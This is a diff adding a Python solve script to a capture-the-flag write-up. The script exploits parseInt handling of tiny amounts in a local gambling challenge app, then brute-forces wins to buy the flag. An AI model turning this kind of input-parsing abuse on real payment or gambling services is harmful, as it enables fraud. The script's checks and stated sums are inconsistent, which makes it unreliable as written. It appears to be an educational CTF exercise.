@@ -143,7 +143,75 @@ Knowing that the convert API uses the parseInt function, I attempted to convert 
 </p>
 Now that my gambling funds have increased by 5 million, I immediately sought to gamble it all away. At this point, I only needed to hit 3 wins in a row before having enough funds to purchase the flag. 
 
-Solve script coming soon
+Solve script: 
+```
+import requests
+
+URL = "http://127.0.0.1:3000"
+
+# Uses the parseInt exploit to obtain coins
+def gambleMicroCoins():
+    session = requests.Session()
+    session.get(URL)
+    # Gamble until we hit 5e^-7 microcoins
+    body = {
+        "amount": 0.00000999999995,
+        "currency": "coins"
+    }
+    response = session.post(f'{URL}/api/gamble', json = body)
+
+    # If we succeed, just make a new session and try again
+    if "true" in response:
+        gambleMicroCoins()
+    return session
+
+# Converts the obtained coins into USD
+def convertCurrency(session):
+    body = {
+        "amount": 5
+    }
+    response = session.post(f'{URL}/api/convert', json = body)
+    return session
+
+def gambleUSD(session, totalMoney):
+    body = {
+        "currency": "usd",
+        "amount": totalMoney
+    }
+    response = session.post(f'{URL}/api/gamble', json = body)
+    return response
+
+def getFlag(session):
+    response = session.post(f'{URL}/api/flag')
+    return response
+
+def runExploit():
+    numWins = 0
+    totalMoney = 0.05
+    session = gambleMicroCoins()
+    session = convertCurrency(session)
+    while (numWins < 3):
+        response = gambleUSD(session, totalMoney)
+        if ("true") in response.text:
+            numWins+=1
+            totalMoney*=10
+            print(response.text)
+        else:
+            session = gambleMicroCoins()
+            session = convertCurrency(session)
+            totalMoney = 0.05
+            numWins = 0
+
+    print(getFlag(session).text)
+
+if __name__ == "__main__":
+    runExploit()
+```
+The script basically uses the ParseInt functionality to obtain $0.05 USD and then brute forces 3 wins in a row to obtain $10 USD for the flag.
+<p align="left">
+  <img src = "images/flag.jpg" width=400>
+</p>
+
 ## References
 https://dmitripavlutin.com/parseint-mystery-javascript/
 https://coderwall.com/p/4eaixa/parseint-can-be-dangerous
